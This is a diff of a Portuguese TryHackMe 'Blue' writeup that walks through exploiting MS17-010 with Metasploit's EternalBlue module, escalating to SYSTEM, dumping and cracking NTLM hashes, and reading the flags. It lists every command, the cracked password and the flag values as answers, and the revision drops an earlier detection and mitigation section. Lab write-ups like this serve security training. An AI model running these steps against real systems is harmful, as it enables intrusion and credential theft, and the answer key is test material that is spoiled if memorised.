@@ -1,173 +1,396 @@
+# Blue (EternalBlue) - Writeup
 
-# Blue — TryHackMe
+Room: ![TryHackMe Badge](https://tryhackme.com/Lucas.Zafalon/badges/blue?utm_campaign=social_share&utm_medium=social&utm_content=badge&utm_source=copy&sharerId=663e76ced6984cc4849c6b91)
 
-**Dificuldade:** Fácil
-**Categoria:** Windows / SMB Exploitation
-**Foco:** Enumeração, exploração (EternalBlue) e pós-exploração
+A room **Blue** do TryHackMe é uma máquina Windows focada na exploração da vulnerabilidade **MS17-010 (EternalBlue)**, famosa por ter sido utilizada no ataque do ransomware WannaCry em 2017.
+Nesta room aprendemos:
+
+* Enumeração com Nmap
+* Exploração SMB
+* Uso do Metasploit
+* Escalação de privilégios
+* Dump de hashes
+* Crack de senhas Windows
+
 
 ---
 
-## 🧠 Resumo
+# Task 1 - Recon
 
-A máquina Blue explora a vulnerabilidade **MS17-010 (EternalBlue)**, permitindo execução remota de código via SMB em sistemas Windows desatualizados.
+A primeira etapa consiste em identificar serviços e possíveis vulnerabilidades na máquina alvo.
 
-O processo incluiu enumeração de portas, identificação da vulnerabilidade, exploração com Metasploit e pós-exploração com elevação de privilégios e estabilização da sessão.
-
----
-
-## 🔍 Enumeração
-
-Inicialmente foi realizado um scan com Nmap para identificar serviços ativos:
+O scan recomendado é:
 
 ```bash
-nmap -sC -sV <IP>
+nmap -sC -sV -Pn <IP>
 ```
 
-### Portas abertas identificadas:
+Ou utilizando scripts de vulnerabilidade:
 
-* 135/tcp — MSRPC
-* 139/tcp — NetBIOS
-* 445/tcp — SMB
+```bash
+nmap --script vuln <IP>
+```
 
-A presença da porta **445** indicou um serviço SMB ativo, comum em sistemas Windows.
+Durante a enumeração encontramos:
+
+* Porta 135 (MSRPC)
+* Porta 139 (NetBIOS)
+* Porta 445 (SMB)
+
+O Nmap também identifica a vulnerabilidade:
+
+```bash
+smb-vuln-ms17-010
+```
+
 
 ---
 
-## 🚨 Identificação da vulnerabilidade
+## Pergunta
 
-Com base na exposição do SMB, foi investigada a possibilidade de vulnerabilidades conhecidas.
+### How many ports are open with a port number under 1000?
 
-A máquina é vulnerável a:
+## Resposta
 
-👉 **MS17-010 (EternalBlue)**
-
-Essa falha permite execução remota de código e foi amplamente explorada em ataques reais, como o ransomware WannaCry.
+```bash
+3
+```
 
 ---
 
-## 💣 Exploração
+## Pergunta
 
-A exploração foi realizada utilizando o Metasploit.
+### What is this machine vulnerable to?
 
-### Módulo utilizado:
+## Resposta
 
+```bash
+ms17-010
 ```
-exploit/windows/smb/ms17_010_eternalblue
-```
 
-### Execução:
+---
+
+# Task 2 - Gain Access
+
+Agora utilizamos o Metasploit para explorar a vulnerabilidade EternalBlue.
+
+Iniciamos o Metasploit:
 
 ```bash
 msfconsole
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS <IP>
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-run
 ```
 
-Após algumas tentativas (instabilidade comum do exploit), foi obtida uma sessão inicial.
+Depois buscamos pelo exploit:
+
+```bash
+search ms17-010
+```
+
+O exploit correto é:
+
+```bash
+exploit/windows/smb/ms17_010_eternalblue
+```
+
 
 ---
 
-## 🔄 Conversão de Shell
+## Pergunta
 
-Caso o acesso inicial não seja Meterpreter, foi utilizada conversão de shell:
+### Find the exploitation code we will run against the machine. What is the full path of the code?
 
+## Resposta
+
+```bash
+exploit/windows/smb/ms17_010_eternalblue
 ```
+
+---
+
+Após selecionar o exploit:
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+```
+
+Visualizamos as opções:
+
+```bash
+show options
+```
+
+Precisamos definir o IP da vítima:
+
+```bash
+set RHOSTS <IP>
+```
+
+---
+
+## Pergunta
+
+### Show options and set the one required value. What is the name of this value?
+
+## Resposta
+
+```bash
+RHOSTS
+```
+
+---
+
+Depois executamos:
+
+```bash
+run
+```
+
+Se tudo ocorrer corretamente, teremos uma shell Meterpreter.
+
+---
+
+# Task 3 - Escalate
+
+Agora vamos melhorar nossa sessão e garantir privilégios elevados.
+
+O módulo utilizado para converter a shell em Meterpreter é:
+
+```bash
 post/multi/manage/shell_to_meterpreter
 ```
 
+
+---
+
+## Pergunta
+
+### What is the full path to the post module we will use?
+
+## Resposta
+
 ```bash
-use post/multi/manage/shell_to_meterpreter
-set SESSION <ID>
+post/multi/manage/shell_to_meterpreter
+```
+
+---
+
+Depois precisamos informar qual sessão será utilizada:
+
+```bash
+set SESSION 1
+```
+
+---
+
+## Pergunta
+
+### What option are we required to change?
+
+## Resposta
+
+```bash
+SESSION
+```
+
+---
+
+Após executar o módulo:
+
+```bash
 run
 ```
 
----
-
-## 🔐 Escalada de privilégios
-
-Dentro do Meterpreter:
+Podemos verificar privilégios:
 
 ```bash
-getsystem
+getuid
 ```
 
-Validação:
+O esperado é:
 
 ```bash
-shell
-whoami
-```
-
-Resultado esperado:
-
-```
-nt authority\system
-```
-
----
-
-## 🔍 Pós-exploração
-
-### Listagem de processos
-
-```bash
-ps
-```
-
-Foi identificado um processo executando como:
-
-```
 NT AUTHORITY\SYSTEM
 ```
 
 ---
 
-### Migração de processo
+# Task 4 - Cracking
 
-Para estabilizar a sessão:
+Agora iremos realizar dump dos hashes do Windows.
+
+No Meterpreter:
 
 ```bash
-migrate <PID>
+hashdump
 ```
 
-A migração pode falhar inicialmente, sendo necessário tentar múltiplos processos.
+Isso irá retornar hashes NTLM dos usuários do sistema.
+
 
 ---
 
-## 🚩 Flags
+## Pergunta
 
-* flag{access_the_machine}: ✅ obtida
-* flag{sam_database_elevated_access}: ✅ obtida
-* flag{admin_documents_can_be_valuable}: ✅ obtida
+### What is the name of the non-default user?
 
----
+## Resposta
 
-## 🧠 Lições aprendidas
-
-* Serviços SMB expostos são um vetor crítico de ataque
-* Vulnerabilidades antigas ainda são amplamente exploráveis
-* Exploits podem ser instáveis e exigir múltiplas tentativas
-* Pós-exploração é essencial para manter acesso
+```bash
+Jon
+```
 
 ---
 
-## 🛡️ Detecção em ambiente SOC
+Após copiar o hash do usuário Jon, utilizamos ferramentas como:
 
-Um time de SOC poderia detectar esse ataque através de:
+* John The Ripper
+* CrackStation
 
-* Tráfego SMB anômalo na porta 445
-* Assinaturas de exploit EternalBlue em IDS/IPS
-* Alertas SIEM relacionados à CVE-2017-0144
-* Execução remota suspeita em endpoints
+O hash revela a senha:
+
+## Pergunta
+
+### What is the cracked password?
+
+## Resposta
+
+```bash
+alqfna22
+```
+
 
 ---
 
-## 🔐 Mitigações
+# Task 5 - Find Flags!
 
-* Aplicar patch MS17-010
-* Desativar SMBv1
-* Monitorar tráfego de rede
-* Utilizar IDS/IPS e EDR
-* Implementar segmentação de rede
+Agora basta navegar pelo sistema Windows em busca das flags.
+
+---
+
+## Flag 1
+
+Localização:
+
+```bash
+C:\flag1.txt
+```
+
+## Resposta
+
+```bash
+flag{access_the_machine}
+```
+
+---
+
+## Flag 2
+
+Localização:
+
+```bash
+C:\Windows\System32\config\flag2.txt
+```
+
+## Resposta
+
+```bash
+flag{sam_database_elevated_access}
+```
+
+---
+
+## Flag 3
+
+Localização:
+
+```bash
+C:\Users\Jon\Documents\flag3.txt
+```
+
+## Resposta
+
+```bash
+flag{admin_documents_can_be_valuable}
+```
+
+
+---
+
+# Problemas Comuns Durante a Room
+
+A exploração do EternalBlue costuma falhar algumas vezes no TryHackMe.
+Problemas comuns:
+
+* Máquina crashando após tentativa
+* “Exploit completed, but no session was created”
+* Payload não conectando
+
+Soluções comuns:
+
+* Reiniciar a máquina
+* Definir corretamente o `LHOST`
+* Tentar novamente o exploit
+* Utilizar o IP da interface VPN (`tun0`)
+
+Muitos usuários relatam que o exploit pode funcionar apenas após várias tentativas.
+
+---
+
+# Sobre o EternalBlue
+
+O EternalBlue explora uma falha no protocolo SMBv1 da Microsoft, identificada como:
+
+```bash
+MS17-010
+```
+
+Essa vulnerabilidade permite:
+
+* Execução remota de código
+* Acesso remoto ao sistema
+* Escalação de privilégios
+
+Foi utilizada em ataques famosos como:
+
+* WannaCry
+* NotPetya
+
+
+---
+
+# Comandos Utilizados
+
+```bash
+nmap -sC -sV -Pn <IP>
+
+msfconsole
+
+search ms17-010
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+show options
+
+set RHOSTS <IP>
+
+run
+
+hashdump
+
+getuid
+```
+
+---
+
+# Conclusão
+
+A room Blue é uma excelente introdução para:
+
+* Exploração SMB
+* Vulnerabilidades Windows
+* Uso do Metasploit
+* Pós-exploração
+* Dump de hashes NTLM
+
+Além disso, ela demonstra na prática o impacto crítico de sistemas Windows desatualizados e vulnerabilidades conhecidas como o MS17-010.
+
